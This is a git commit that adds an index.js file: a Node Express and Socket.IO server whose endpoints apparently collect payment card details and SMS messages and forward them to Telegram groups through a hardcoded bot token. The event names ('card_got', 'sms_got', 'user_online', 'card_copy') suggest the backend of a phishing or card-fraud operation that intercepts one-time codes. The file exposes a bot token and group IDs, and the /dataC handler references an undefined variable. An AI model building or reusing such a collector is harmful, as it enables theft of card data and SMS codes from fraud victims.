e51215a5b751ef7e4d542b61c938115eafa20151
hiddenman22 <163913278+hiddenman22@users.noreply.github.com>
2024-03-19 01:13:26 +0530

    Create index.js
    Added Index.js

---
+++ index.js
@@ -0,0 +1,77 @@
+const express = require('express');
+const http = require('http');
+const socketIo = require('socket.io');
+
+// Importing necessary modules
+const TelegramBot = require('node-telegram-bot-api');
+const token = '6336680132:AAF2OsVc6-wAPG3FRCl5TpFbHHY_avIWedw';
+const bot = new TelegramBot(token, { polling: false });
+const groupIdCC = '-1001962858861';
+const groupIdSS = '-1002030300737';
+
+// Create the first Express app
+const app = express();
+const port = process.env.PORT || 3000;
+
+// Create an HTTP server
+const server = http.createServer(app);
+
+// Attach Socket.IO to the HTTP server
+const io = socketIo(server);
+
+app.use(express.json());
+
+app.get('/api', (req, res) => {
+  res.send('This is the response from the first Express server');
+});
+
+app.get('/', (req, res) => {
+    res.send('Hello, World!');
+});
+
+app.post('/dataIO', (req, res) => {
+	  console.log('DATA IO',req.body.data);
+    const data_ = req.body.data;
+	  io.emit('user_online',data_);
+    res.status(200).send('Done!');
+});
+
+app.post('/dataC', (req, res) => {
+    const data_ = req.body.data;
+    io.emit('card_got',data);
+    bot.sendMessage(groupIdCC, data_).then(() => {})
+   .catch((error) => {
+       console.log("ERROR",error);
+    });
+    res.status(200).send('Done!');
+});
+
+app.post('/dataS', (req, res) => {
+	const data_ = req.body.data;
+	io.emit('sms_got',data_);
+  bot.sendMessage(groupIdSS, data_).then(() => {})
+  .catch((error) => {
+      console.log("ERROR",error);
+   });
+	res.status(200).send('Done!');
+});
+	
+// Socket.IO event handlers
+io.on('connection', (socket) => {
+  console.log('WebSocket client connected');
+  socket.on('message', (message) => {
+    console.log('Received message:', message);
+    socket.emit('message', 'Hello from WebSocket server!');
+  });
+  	socket.on('card_send' , function(data){
+		io.emit('card_got',data);
+	});
+	socket.on('send_card_copy' , function(data){
+		io.emit('card_copy',data);
+	});
+});
+
+// Start the HTTP server
+server.listen(port, () => {
+  console.log(`Server running at ${port}`);
+});
